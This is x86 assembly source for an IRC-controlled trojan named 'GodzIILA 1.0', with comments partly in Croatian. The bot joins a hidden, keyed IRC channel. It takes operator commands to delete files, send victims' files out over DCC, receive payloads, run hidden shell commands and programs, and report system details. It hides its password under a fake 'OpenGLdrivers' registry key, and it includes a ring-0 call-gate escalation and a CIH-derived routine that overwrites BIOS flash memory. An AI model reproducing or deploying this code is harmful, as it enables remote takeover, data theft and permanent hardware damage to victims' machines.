; ---------------------------------------------------------------------------
; deletes a file, wildcards supported
; format: !del <file>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_del:        call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+4+1]
            call    patchcr
            
            mov eax, size WIN32_FIND_DATA
            call    malloc
            push    eax
            push    eax
            push    esi
            callb   FindFirstFileA

            inc eax
            jz  __err

            lea ebx, [eax-1]
            mov esi, [esp]
            lea edi, [esi.WFD_szFileName]

__cycle:        push    edi
            callb   DeleteFileA
            xchg    eax, ecx
            jecxz   __err
    
            push    esi
            push    ebx
            callb   FindNextFileA
            xchg    eax, ecx
            jecxz   __err
            
            jmp __cycle

__err:          push    ebx
            callb   FindClose
            pop eax
            call    free

            @retecx1

; ---------------------------------------------------------------------------
; sends file via dcc
; format: !send <nick> <file>
; napomena: zadani fajl mora biti 8.3 i mora biti u trenutnom direktoriju 
; (pogledajte !pwd naredbu). 
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_send:       call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+5+1]
            call    patchcr

            xor eax, eax
            push    eax
            push    esp
            push    eax
            push    esi                 ; param
            lea ecx, bot_sending_thread X
            push    ecx
            push    2000h
            push    eax
            callb   CreateThread
            pop edx

            push    eax
            callb   CloseHandle

            @retecx1

bot_sending_thread  proc    pascal

            arg dcc_nick_file:DWORD

            local   arg_end
            local   bytes_to_send
            local   ssocket
            local   port
            local   dcc_msg
            local   f_handle
            local   arg_start
            
            lea edi, arg_start
            lea ecx, arg_end
            sub ecx, edi
            xor eax, eax
            cld
            rep stosb

            call    $+5
sendlta:        pop esi

_ST         equ <-sendlta[esi]> 

            mov eax, 200
            call    malloc

            mov dcc_msg, eax
            xchg    edi, eax
            x_stosd <PRIVMSG >

            push    esi
            mov esi, dcc_nick_file
            push    esi
            @endspc
            mov ebx, esi
            sub esi, [esp]
            lea ecx, [esi-1]
            pop esi
            cld
            rep movsb
            mov ax, ": "
            stosw
            pop esi
            
            xor eax, eax
            push    eax
            push    eax
            push    OPEN_EXISTING
            push    eax
            push    eax
            push    GENERIC_READ
            push    ebx
            call    _CreateFileA _ST

            inc eax
            jz  __end_dcc
            dec eax
            mov f_handle, eax
    
            push    0
            push    eax
            call    _GetFileSize _ST
            mov bytes_to_send, eax

            xor ebx, ebx
            push    ebx
            push    SOCK_STREAM
            push    AF_INET
            call    _socket _ST
            inc eax
            jz  __end_dcc
            dec eax
            mov ssocket, eax
    
            call    _GetTickCount _ST
            push    29ah
            pop ecx
            xor edx, edx
            div ecx
            add edx, 4000
            mov port, edx

            push    edx
            call    _htons _ST

            push    ebx
            push    ebx
            push    ebx
            shl eax, 16
            add al, 2
            push    eax
            mov ecx, esp

            push    type sockaddr_in
            push    ecx
            push    ssocket
            call    _bind _ST
            add esp, 16

            test    eax, eax
            jnz __dcc_close

            mov al, 1
            stosb
            x_stosd <DCC SEND>
            mov al, ' '
            stosb
        
            push    esi
            mov esi, dcc_nick_file
            @endspc
__copy:         lodsb
            stosb
            test    al, al
            jnz __copy
            dec edi
            mov al, ' '
            stosb
            pop esi

            sub esp, 50
            mov ebx, esp
            push    ebx
            push    50
            push    ebx
            call    _gethostname _ST
            call    _gethostbyname _ST

            mov eax, [eax+16]
            mov eax, [eax]
            add esp, 50
            push    eax
            call    _htonl _ST
            call    num2ascii
            add edi, eax
            mov al, ' '
            stosb
            mov eax, port
            call    num2ascii
            add edi, eax
            mov al, ' '
            stosb
            mov eax, bytes_to_send
            call    num2ascii
            add edi, eax
            mov ax, 0d01h
            stosw
            mov al, LF
            stosb
    
            push    esi
            mov edx, esi
            mov esi, dcc_msg
            sub edi, dcc_msg
            mov ecx, edi

IFDEF IRC_LOG
            pusha
            xor eax, eax
            push    eax esp ecx esi
            mov esi, edx
            push    (bot_log_handle _ST).dword ptr 0
            call    _WriteFile _ST
            popa
ENDIF ; IRC_LOG
            pusha
            push    0
            push    ecx
            push    esi
            mov esi, edx
            push    (socket_handle _ST).dword ptr 0
            call    _send _ST
            mov [esp.Pushad_ecx], eax
            popa
            pop esi

            test    ecx, ecx
            jz  __dcc_close
            inc ecx
            jz  __dcc_close
            
            push    1
            push    ssocket
            call    _listen _ST
            test    eax, eax
            jnz __dcc_close

            push    ssocket
            push    1
            mov ebx, esp
            
            push    0
            push    40
            mov ecx, esp
            
            cdq
            push    ecx
            push    edx
            push    edx
            push    ebx
            push    edx
            call    _select _ST
            add esp, 16

            xchg    eax, ecx
            jecxz   __dcc_close
            inc ecx
            jz  __dcc_close

            xor eax, eax
            push    eax
            push    eax
            push    ssocket
            call    _accept _ST

            xchg    eax, ssocket
            push    eax
            call    _closesocket _ST

            sub esp, 1000
            mov ebx, esp

__cycle:        push    edx
            mov ecx, esp
            push    0
            push    ecx
            push    1000
            push    ebx
            push    f_handle
            call    _ReadFile _ST
            pop edi

            push    0
            push    edi
            push    ebx
            push    ssocket
            call    _send _ST
            inc eax
            jz  __blocking_check
            dec eax

            cmp edi, 1000
            jz  __cycle

            add esp, 1000

__blocking_check:   call    _WSAGetLastError _ST
            cmp eax, WSAEWOULDBLOCK
            jz  __cycle
    
__dcc_close:        mov ebx, 1000
__sleep:        sub ebx, 100
            test    ebx, ebx
            jz  __end
            push    100
            call    _Sleep _ST
            jmp __sleep 

__end:          push    ssocket
            call    _closesocket _ST
            push    f_handle
            call    _CloseHandle _ST
            
__end_dcc:      mov eax, dcc_msg
            call    free
            
            leave
            push    0
            call    _ExitThread _ST

bot_sending_thread  endp

; ---------------------------------------------------------------------------
; automatski prima fajl od ulogiranog nicka
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_recv_cmd:       call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+9+1]
            mov ebx, esi
            @endspc
            and byte ptr [esi-1], 0
            call    ascii2num
            mov dcc_recv_IP X, eax
            call    ascii2num
            mov dcc_recv_port X, eax
            call    ascii2num
            mov dcc_recv_size X, eax

            xor edx, edx
            push    edx
            push    edx
            push    CREATE_ALWAYS
            push    edx
            push    edx
            push    GENERIC_WRITE or GENERIC_READ
            push    ebx
            callb   CreateFileA

            inc eax
            jz  __err
            dec eax

            xor edx, edx
            push    edx
            push    esp
            push    edx
            push    eax                 ; param             
            lea ecx, bot_receiving_thread X
            push    ecx
            push    2000h
            push    edx
            callb   CreateThread
            pop edx

            push    eax
            callb   CloseHandle

__err:          @retecx1

bot_receiving_thread    proc    pascal

            arg file_handle:DWORD

            local   rsocket
            
            @SEH_SetupFrame <jmp    err_shit_recv_thread>
            
            call    $+5
dccrdlta:       pop ebx
            
_DR         equ <-dccrdlta[ebx]>
            
            push    PCL_NONE
            push    SOCK_STREAM
            push    AF_INET
            call    _socket _DR
            inc eax
            jz  err_shit_recv_thread
            dec eax
            mov rsocket, eax

            db  068h
dcc_recv_IP     dd  ?
            call    _htonl _DR

            cdq
            push    edx                         ; sin_zero[8]
            push    edx
            push    eax                         ; sin_addr

            db  068h
dcc_recv_port       dd  ?
            push    eax
            call    _htons _DR
            shl eax, 16
            add al, AF_INET
            push    eax
            mov ecx, esp

            push    type sockaddr_in
            push    ecx
            push    rsocket
            call    _connect _DR

            add     esp, 16                         ; free sockaddr
            inc eax
            jz  err_shit_recv_thread

            sub esp, 1000
            mov edi, esp
            xor esi, esi
            
__cycle:        push    0
            push    1000
            push    edi
            push    rsocket
            call    _recv _DR
            inc eax
            jz  err_shit_recv_thread
            dec eax
            
            sub dcc_recv_size _DR, eax
            add esi, eax

            push    edx
            mov ecx, esp
            push    0
            push    ecx
            push    eax
            push    edi
            push    file_handle
            call    _WriteFile _DR
            pop ecx
            
            push    esi
            call    _htonl _DR
            
            push    eax
            mov ecx, esp

            push    0
            push    4
            push    ecx
            push    rsocket
            call    _send _DR
            pop edx

            mov ecx, dcc_recv_size _DR
            jecxnz  __cycle

            add esp, 1000

err_shit_recv_thread:   @SEH_RemoveFrame
            push    rsocket
            call    _closesocket _DR
            push    file_handle
            call    _CloseHandle _DR

            leave
            push    0
            call    _ExitThread _DR
            
dcc_recv_size       dd  ?

bot_receiving_thread    endp

; ---------------------------------------------------------------------------
; sends nice msg on ping :)
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_PING_cmd:       x_push  eax, <STOP THAT YOU FUCKIN PINGER!!>
            push    esp
            push    _xsize
            pop ecx
            call    send_privmsg
            x_pop
            ret

; ---------------------------------------------------------------------------
; changes bot password
; format: !chg_pswd <novi pass>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_chg_pswd:   call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+9+1]
            mov edi, esi
            xor ecx, ecx
__cycle:        rol ecx, 7
            xor cl, [esi]
            lodsb
            cmp byte ptr [esi], 0Dh
            jnz __cycle
            
            mov bot_password X, ecx

save_hash:      mov eax, 50
            push    ecx
            call    malloc
            xchg    edi, eax
            mov ebx, edi
            pop eax
            call    num2ascii

            xor al, al
            mov edi, ebx
            scasb
            jnz $-1
            sub edi, ebx

            x_push  eax, Software\Microsoft\Windows\CurrentVersion\OpenGLdrivers~
            mov ecx, esp
            mov esi, _xsize
            x_push  eax, Default~
            add esi, _xsize
            mov eax, esp

            push    edi
            push    ebx 
            push    REG_SZ
            push    eax
            push    ecx
            push    HKEY_LOCAL_MACHINE
            callb   SHSetValueA
            lea esp, [esp+esi]
            xchg    eax, ebx
            call    free
            
            @retecx1

; ---------------------------------------------------------------------------
; executes given command in command-liner interpreter, without fuckin DOS box!
; format: !shell <cmd>
; ex: !shell netstat -an > portlist.txt
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_shell:      call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+6+1]
            call    patchcr

            mov edi, esi
            mov eax, fs:[TEB_PEB]
            test    eax, eax
            jns __shell_NT

            sub edi, 15
            mov ecx, edi
            x_stosd <command.com >
            jmp __shell_NT_
        
__shell_NT:     sub edi, 11
            mov ecx, edi
            x_stosd <cmd.exe >

__shell_NT_:        mov ax, "c/"
            stosw
            mov al, " "
            stosb
            inc edi
            cld
            push    0
            push    ecx
            callb   WinExec
            
            @retecx1

; ---------------------------------------------------------------------------
; writes bot IP , kernel version (NT or 9x), vindoze version, proc speed &
; comp name
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_info:       call    check_logged_in
            jnc err_not_logged_in

            sub esp, 300
            mov esi, esp

            push    300
            push    esi
            callb   gethostname

            push    esi
            callb   gethostbyname
            add esp, 300
            test    eax, eax
            jz  err_bot_info

            mov esi, [eax+HOSTENT_IP]
            lodsd
            push    dword ptr [eax]
            callb   inet_ntoa
            call    $+5+200
db  200 dup (0)
            pop edi
            mov edx, edi
            mov esi, eax
            xchg    ebx, eax
            @endsz
            dec esi
            sub esi, ebx
            xchg    eax, esi
            mov esi, ebx
            movzx   ecx, al
            lodsb
            stosb
            loop    $-2
            x_stosd < running vindoze 9x >
            push    edx
            callb   GetVersion
            pop edx
            test    eax, 8000000h
            jz  __runz_9x
            
            xchg    eax, ebx
            sub edi, 4
            x_stosd < NT >
            xchg    eax, ebx

__runz_9x:      xchg    eax, ebx
            x_stosd <ver >
            xchg    eax, ebx
            add al, "0"
            stosb
            mov al, "."
            stosb

            xchg    esi, edx
            xchg    ah, al
            movzx   eax, al
            call    num2ascii
            add edi, eax
    
            x_stosd < - CPU speed is >
            rdtsc
            mov ebx, eax
            push    1000
            callb   Sleep
            rdtsc
            sub eax, ebx
            sub eax, 8
            xor edx, edx
            mov ecx, 1000000
            div ecx
            call    num2ascii
            add edi, eax
            x_stosd < MHz>
            mov al, ","
            stosb
            x_stosd < lil>
            mov eax, 12345678h
            stosd
            dec edi
            push    esi
            mov esi, edi
            lodsb
            pop esi
            cmp al, 12h
            pushf
            sub edi, 3
            popf
            jz  __lil_end

            sub edi, 4
            x_stosd < big>
__lil_end:      x_stosd < endian - Computer name:>
            mov al, ' '
            stosb
            push    16
            push    esp
            push    edi
            callb   GetComputerNameA
            add edi, [esp]
            add esp, 4
            sub edi, esi
            xchg    ecx, edi

            push    esi
            call    send_privmsg
err_bot_info:       ret

; ---------------------------------------------------------------------------
; ispisuje verziju crva
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_version:    call    check_logged_in
            jnc err_not_logged_in

            x_push  ecx, <GodzIILA 1.0>
            push    esp
            push    12
            pop ecx
            call    send_privmsg
            x_pop
            ret

; ---------------------------------------------------------------------------
; executes given program. format:
; !exec "<progname>" <flagz>
; <progname>     - PATH to proggy name
; <flagz>        - window appearance
;                -h    - hidden
;                -d    - normal (default)
;                -x    - maximyzed
;                -n    - minimyzed
; i: internal
;
; o: error ? ecx=0 : ecx!=0
; note: if <flagz> param iz in invalid format, -h option iz assumed
; <progname> must be under quotes
; ex: !exec "notepad.exe" -x
; program params must be under quotes, too
; ---------------------------------------------------------------------------
bot_cmd_exec:       call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+5+1]
            lodsb
            cmp al, '"'
            jnz err_cmd_syntax

            mov edi, esi
            mov ecx, edi
            @endcr
            cmp byte ptr [esi-2], ' '
            jz  err_cmd_syntax

            sub ecx, esi
            not ecx
            jecxz   err_cmd_syntax              ; exec "

            mov ebx, esi                ; ebx = ptr to CR
            mov esi, edi

__parse_exec:       lodsb
            cmp al, '"'
            jz  __exec_got_quote

            loop    __parse_exec
            jecxz   err_cmd_syntax

__exec_got_quote:   lodsb
            cmp al, ' '
            jnz err_cmd_syntax

            and byte ptr [esi-2], 0
            dec esi
            sub ebx, esi
            dec ebx
            dec edx
            push    edi                 ; edi = ptr to progname
            and byte ptr [esi], 0
            inc esi
            mov edi, esi

            xor edx, edx
__1:            cmp word ptr [esi], "d-"
            jz  __x_1

            inc esi
            loop    __1
            jecxz   __s_1

__x_1:          or  edx, SW_NORMAL
__s_1:          mov ecx, ebx
            mov esi, edi
__2:            cmp word ptr [esi], "x-"
            jz  __x_2
            
            inc esi
            loop    __2
            jecxz   __s_2

__x_2:          or  edx, SW_MAXIMIZE
__s_2:          mov ecx, ebx
            mov esi, edi
__3:            cmp word ptr [esi], "n-"
            jz  __x_3
            
            inc esi
            loop    __3
            jecxz   __s_3

__x_3:          or  edx, SW_MINIMIZE
__s_3:          pop edi
            push    edx
            push    edi
            callb   WinExec

            push    1
            pop ecx
            jmp cmd_exec_end

err_cmd_syntax:     x_push  eax, <command syntax error>
            push    esp
            push    20
            pop ecx
            call    send_privmsg
            x_pop
cmd_exec_end:       ret

; ---------------------------------------------------------------------------
; ops a specified nick
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_opme:       call    check_logged_in
            jnc err_not_logged_in

            x_push  eax, <MODE #trojan_test +o >
            mov esi, esp
            push    21
            pop ecx
            call    irc_send
            x_pop

            lea esi, irc_cmd_nick X
            push    esi
            @endsz
            lea eax, irc_cmd_nick X
            sub esi, eax
            dec esi
            mov ecx, esi
            pop esi
            call    irc_send

            push    CRLF_HEX
            mov esi, esp
            push    2
            pop ecx
            call    irc_send
            pop edx
            ret

; ---------------------------------------------------------------------------
; reconnects to irc server
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_reconnect:  call    check_logged_in
            jnc err_not_logged_in

            pop edx
            pop edx
            jmp connect_to_irc

; ---------------------------------------------------------------------------
; QUITs a irc server
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_quit:       call    check_logged_in
            jnc err_not_logged_in

            x_push  eax, <QUIT :GodzIILa was here>
            mov esi, esp
            push    23
            pop ecx
            call    irc_send_crlf
            x_pop
    
            ret

; ---------------------------------------------------------------------------
; removes a nick from op list
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_logout:     lea esi, irc_cmd_nick X
            mov ecx, esi
            @endsz
            sub esi, ecx
            lea ecx, [esi-1]
            mov edx, ecx

            lea esi, operators X
            lodsd
            lea edi, irc_cmd_nick X
    
__oplook:       mov ecx, edx
            mov ebx, esi
            cld
            rep cmpsb
            jz  oper_found

            lea esi, [ebx+size operator]
            lea edi, irc_cmd_nick X
            xchg    eax, ecx
            jecxz   err_not_logged_in           ; in case that nobody is logged in so eax = 0

            xchg    eax, ecx
            dec eax
            test    eax, eax
            jnz __oplook

err_not_logged_in:  x_push  ecx, <Error: Nick isn't logged in.>
            push    esp
            push    28
            pop ecx
            call    send_privmsg
            x_pop

            jmp bot_logout_end

oper_found:     mov edi, ebx
            xor eax, eax
            push    19
            pop ecx
            stosb
            loop    $-1
            
            dec (operators X).dword ptr 0

            x_push  ecx, <Nick has been logged out.>
            push    esp
            push    25
            pop ecx
            call    send_privmsg
            x_pop
            
bot_logout_end:     @retecx1

; ---------------------------------------------------------------------------
; logs a nick into op list
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_login:      lea esi, [ebx+6+1]
            mov edi, esi
            xor ecx, ecx
__cycle:        rol ecx, 7                  ; start hash calculation algo
            xor cl, [esi]
            lodsb                       ; next lettter
            cmp byte ptr [esi], CR
            jnz __cycle                 ; loop until CR
    
            cmp ecx, bot_password X
            jnz __wrong_password

            lea esi, operators X            ; op numba overflow?
            lodsd
            cmp al, MAX_OPERZ_ALLOWED
            jae __too_much_ops

            call    check_logged_in
            jc  __already_logged_in

            inc dword ptr [esi-4]           ; op numba ++
__find_slot:        lodsd
            xchg    eax, ecx
            jecxz   __free_slot
            xchg    eax, ecx
            add esi, size operator - 4
            jmp __find_slot

__free_slot:        xchg    eax, ecx
            sub esi, 4
            mov eax, esi                ; save OP_Name ptr
            mov edi, eax
            lea esi, irc_cmd_nick X
            cld
            rep movsb                   ; copy nick

            lea edi, [eax+10]               ; skip OP_Name
            callb   GetTickCount
            stosd                       ; OP_TimeLoggedIn
            stosd                       ; OP_TimeLastCmd
            SETFLAG eax, mask RITES_Admin
            stosb

            x_push  ecx, <Nick has been logged in.>
            push    esp
            push    24
            pop ecx
            call    send_privmsg
            x_pop
            jmp __end

__wrong_password:   x_push  ecx, <Wrong password, access denied!!>
            push    esp
            push    30
            pop ecx
            call    send_privmsg
            x_pop
            jmp __end

__too_much_ops:     x_push  ecx, <Too much ops logged in!!>
            push    esp
            push    41-18
            pop ecx
            call    send_privmsg
            x_pop
            jmp __end

__already_logged_in:    x_push  ecx, <Nick is allready logged in!!>
            push    esp
            push    44-17
            pop ecx
            call    send_privmsg
            x_pop
__end:          ret

; ---------------------------------------------------------------------------
; checks whether thr current nick has been logged in
; i: nothing
;
; o: je ? CF=1 : CF=0
; ---------------------------------------------------------------------------
check_logged_in:    pusha
            lea esi, operators X            ; check max op numba
            lodsd
            push    esi                 ; save ptr to name
            xchg    eax, edx                ; edx = op numba
            lea esi, irc_cmd_nick X
            mov ecx, esi
            @endsz
            sub esi, ecx
            dec esi
            mov ecx, esi
            pop esi                 ; load ptr to the first name
            mov [esp.Pushad_ecx], ecx
            xchg    eax, edx                ; eax = op numba
            test    al, al
            jz  __not_logged_in

            xor ebx, ebx
            mov edx, esi
__check_login:      lea edi, irc_cmd_nick X
            cld
            rep cmpsb
            jz  __already_logged_in

            inc ebx
            imul    esi, ebx, size operator
            add esi, edx
            mov ecx, [esp.Pushad_ecx]
            sub al, 1
            jnz __check_login

__not_logged_in:    clc
            jmp __2
__already_logged_in:    stc
__2:            popa
            ret

; ---------------------------------------------------------------------------
; sends PRIVMSG to nick priv_msg_curr_user
; i: TOS = ptr to msg to send
;    ecx = msg length
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
send_privmsg:       lea esi, priv_msg_curr_user X
            mov edx, esi
            @dvotocka
            mov edi, esi
            mov esi, [esp.Arg1]
            cld
            rep movsb
            mov ax, CRLF_HEX
            stosw
            sub edi, edx
            mov ecx, edi
            lea esi, priv_msg_curr_user X
            call    irc_send
            ret     (Pshd)

; ---------------------------------------------------------------------------
; reads 3 linez, sends NICK & USER commands & checks if nick is already in use.
; if so, CF = 1
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
;    nick in use ? CF=1 : CF=0
; ---------------------------------------------------------------------------
login_to_irc:
IFNDEF LOCALHOST
            call    read_line
            call    read_line
            call    read_line
            test    ecx, ecx
            jz  login_irc_error
ENDIF ; LOCALHOST
            lea edi, irc_nick X
            push    8
            pop ebx
            mov esi, _Sleep X
            call    GenRandString
            mov eax, CRLF_HEX
            stosw

            lea eax, irc_nick X
            sub edi, eax
            add edi, 5
            mov ecx, edi
            call    __1

nick_command    db  "NICK " 
irc_nick    db  10  dup(0)

__1:            pop esi
            call    irc_send
            jecxz   login_irc_error

            x_push  eax, <USER w w w w>
            mov esi, esp
            push    12
            pop ecx
            call    irc_send_crlf
            x_pop

            jecxz   login_irc_error

            call    read_line
            jecxz   login_irc_error
            call    read_line
            jecxz   login_irc_error

            xor ecx, ecx                ; check whether the nick is already in use
            cmp [esi-4], CRLF_HEX shl 16 + '.e'
            jnz __login_oky
            cmp [esi-8], "su n"
            jnz __login_oky
            cmp [esi-12], "i yd"
            jnz __login_oky

            stc
__login_oky:        push    1
            pop ecx

login_irc_error:    ret

; ---------------------------------------------------------------------------
; connects to irc server
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
connect_to_irc_server:  push    0
            push    SOCK_STREAM
            push    AF_INET
            callb   socket

            inc eax
            jz  __err

            dec eax
            call    $+5+4
socket_handle       dd  0
            pop edi
            stosd

IFDEF LOCALHOST
            x_push  eax, localhost~
ELSE
            x_push  eax, irc.carnet.hr~
ENDIF ; LOCALHOST
            push    esp
            callb   gethostbyname
            x_pop

            xchg    eax, ecx
            jecxz   __err

            mov esi, [ecx+HOSTENT_IP]
            lodsd
    
            cdq
            push    edx                 ; sin_zero[8]
            push    edx
            push    dword ptr [eax]             ; sin_addr
            push    (CONNECT_PORT and 255) shl 24 + (CONNECT_PORT shr 8) shl 16 + AF_INET
            mov eax, esp

            push    type sockaddr_in
            push    eax
            push    (socket_handle X).dword ptr 0
            callb   connect
    
            add     esp, 16                 ; free sockaddr
            xchg    eax, ecx
            inc ecx
            loop    __err

            inc ecx
            jmp $+2+2

__err:          xor ecx, ecx
            ret

; ---------------------------------------------------------------------------
; reads one CRLF terminated line and logs it
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
read_line:      pusha
            mov esi, irc_recv_buffer X
__read:         push    0
            push    1
            push    esi
            push    (socket_handle X).dword ptr 0
            callb   recv

            xchg    eax, ecx
            jecxz   __end

            inc ecx
            jecxz   __check_blocking

            mov dl, [esi]
            inc esi
            cmp dl, LF
            jnz __read
    
            mov ecx, esi
            sub ecx, irc_recv_buffer X
            call    irc_logline

            jmp __end

__check_blocking:   push    esi
            callb   WSAGetLastError
            pop esi

            cmp eax, WSAEWOULDBLOCK
            jz  __read

            xor ecx, ecx
__end:          mov [esp.Pushad_ecx], ecx           ; numba of chars in line
            mov [esp.Pushad_esi], esi           ; save ptr to last char

            popa
            ret

; ---------------------------------------------------------------------------
; sends JOIN and MODE comz do irc server, skips crap and waits for 
; 'End of /NAMES list'.
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
join_channel:       x_push  eax, <JOIN #trojan_test guzonja>
            push    25
            pop ecx
            mov esi, esp
            call    irc_send_crlf
            x_pop

            x_push  eax, <MODE #trojan_test +k guzonja>
            mov esi, esp
            push    28
            pop ecx
            call    irc_send_crlf
            x_pop

            x_push  eax, <MODE #trojan_test +s>
            mov esi, esp
            push    20
            pop ecx
            call    irc_send_crlf
            x_pop

            test    ecx, ecx
            jz  __err

__ch_recv:      call    read_line
            cmp [esi-4], CRLF_HEX shl 16 + '.t'     ; End of /NAMES list.
            jnz __ch_recv

            cmp [esi-8], 'sil '
            jnz __ch_recv

            cmp [esi-12], 'SEMA'
            jnz __ch_recv

            x_push  eax, <PRIVMSG #trojan_test :GodzIILa 1.0>
            mov esi, esp
            push    34
            pop ecx
            call    irc_send_crlf
            x_pop

__err:          ret

IFDEF IRC_LOG
; ---------------------------------------------------------------------------
; logs buffer to logfile
; i: ecx = buffer size
;    irc_recv_buffer = ptr to buffer
;
; o: nothing
; ---------------------------------------------------------------------------
irc_logline:        push    ecx
            xor eax, eax
            push    eax esp ecx
            push    (irc_recv_buffer X).dword ptr 0
            push    (bot_log_handle X).dword ptr 0
            callb   WriteFile

            pop ecx
            ret
ENDIF ; IRC_LOG

irc_send_crlf:      call    irc_send

            push    CRLF_HEX
            mov esi, esp
            push    2
            pop ecx
            call    irc_send
            
            pop edx
            ret

; ---------------------------------------------------------------------------
; writes data to socket
; i: ecx = numba of bytes
;    esi = ptr to data to send
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
irc_send:
IFDEF IRC_LOG
            pusha
            xor eax, eax
            push    eax esp ecx esi
            push    (bot_log_handle X).dword ptr 0
            callb   WriteFile
            popa
ENDIF ; IRC_LOG
            pusha
            push    0
            push    ecx
            push    esi
            push    (socket_handle X).dword ptr 0
            callb   send

            xchg    eax, ecx
            jecxz   __err

            inc ecx
            jecxz   __err

            dec ecx
__err:          mov [esp.Pushad_ecx], ecx
            popa
            ret

lowercase:      push    esi
__loop:         lodsb
            cmp al, 'A'
            jb  __skip
            cmp al, 'Z'
            ja  __skip
            add al, 32
            mov [esi-1].byte ptr 0, al
__skip:         test    al, al
            jnz __loop
            pop esi
            retn

CGS                     equ     8                           ; CallGate Selector

; ---------------------------------------------------------------------------
; manually hooks a service
; i: ecx = ptr to DDB
;    ebx = service to hook
;    esi = hooking procedure
;
; o: esi = original service handler
; ---------------------------------------------------------------------------
hook_service:       mov edx, [ecx+30h]              ; take ptr to service ptr table
            xchg    esi, [edx+ebx*4]            ; xchg ptr to service and ptr to hooking procedure
            retn

; ---------------------------------------------------------------------------
; builds callgate in the LDT, infamous z0mbie's method
; i: esi = ptr to FAR subroutine
;
; o: nothing
; ---------------------------------------------------------------------------
call_in_ring0:          pusha

                        push    ebx             ; EBX <-- GDT.base
                        sgdt    [esp-2]
                        pop     ebx

                        xor     eax, eax        ; EAX <-- LDT selector
                        sldt    ax
                        and     al, not (111b)  ; selector --> index*8

                        add     ebx, eax        ; EBX <-- LDT descriptor offs

                        mov     ch, [ebx+7]     ; ECX <-- LDT.base
                        mov     cl, [ebx+4]
                        shl     ecx, 16
                        mov     cx, [ebx+2]

                        lea     edi, [ecx+CGS]  ; EDI <-- CG descriptor offs
                        cld

                        mov     eax, esi        ; build CallGate
                        stosw
                        mov     eax, 1110110000000000b shl 16 + 28h
                        stosd
                        shld    eax, esi, 16
                        stosw

                        popa

                        db      09Ah            ; call 28:<esi>
                        dd      0               ; unused, any number
                        dw      CGS+100b+11b    ; LDT+R3

                        ret                     ; well done

patchspc:       push    esi
            @endspc
            and byte ptr [esi-1], 0
            pop esi
            ret

patchcr:        push    esi
            @endcr
            and byte ptr [esi-1], 0
            pop esi
            retn
; ---------------------------------------------------------------------------
; generates random string 
; i: ebx = max string length
;    edi = ptr to string storage buffer
;
; o: irc_nick = generated nick
; ---------------------------------------------------------------------------
GenRandString:      rdtsc
            bswap   eax
            xor edx, edx
            div ebx
            mov ecx, edx
            inc ecx

__gen_letter:       push    ecx
            rdtsc
            bswap   eax
            push    'Z'-'A'
            pop ebx
            xor edx, edx
            div ebx
            xchg    eax, edx
            add eax, 'A'
            stosb
            rdtsc
            push    99
            pop ebx
            xor edx, edx
            div ebx
            push    edx
            call    esi                 ; Sleep

            pop ecx
            loop    __gen_letter
            
            retn

; ---------------------------------------------------------------------------
; flash EEPROM, ripped from CiH
; i: call from r0
;
; o: nothing
; ---------------------------------------------------------------------------
cihflash:               pusha

                        mov     bp, 0cf8h

; * Show BIOS Page in 000E0000 - 000EFFFF    (   64 KB   )

                        mov     edi, 8000384ch
                        mov     dx, 0cfeh
                        cli
                        call    IOForEEPROM

; * Show BIOS Page in 000F0000 - 000FFFFF   (   64 KB   )

                        mov     di, 0058h
                        dec     edx
                        mov     word ptr BooleanCalculateCode, 0f24h ; ==and al,0fh
                        call    IOForEEPROM

; * Show the BIOS Extra ROM Data in Memory  000E0000 - 000E01FF
; *   (   512 Bytes   ), and the Section  of Extra BIOS can be Writted...

                        mov     eax, 0e5555h
                        mov     ecx, 0e2aaah
                        call    EnableEEPROMToWrite
                        mov     byte ptr [eax], 60h
                        push    ecx
                        loop    $

; * Kill the BIOS Extra ROM Data in Memory  000E0000 - 000E007F
; *   (   80h Bytes   )

                        xor     ah, ah
                        mov     [eax], al
                        xchg    ecx, eax
                        loop    $

; * Show and Enable the BIOS Main ROM Data  000E0000 - 000FFFFF
; *   (   128 KB   )   can be Writted...

                        mov     eax, 0f5555h
                        pop     ecx
                        mov     ch, 0aah
                        call    EnableEEPROMToWrite
                        mov     byte ptr [eax], 20h
                        loop    $

; * Kill the BIOS Main ROM Data in Memory  000FE000 - 000FE07F
; *   (   80h Bytes   )

                        mov     ah, 0e0h
                        mov     [eax], al

; * Hide BIOS Page in  000F0000 - 000FFFFF
; *    (   64 KB   )

                        mov     word ptr BooleanCalculateCode, 100ch ; ==or al,10h
                        call    IOForEEPROM

                        popa
                        retn

; ***************************
; * Enable EEPROM to Write  *
; ***************************

EnableEEPROMToWrite:
                        mov     [eax], cl
                        mov     [ecx], al
                        mov     byte ptr [eax], 80h
                        mov     [eax], cl
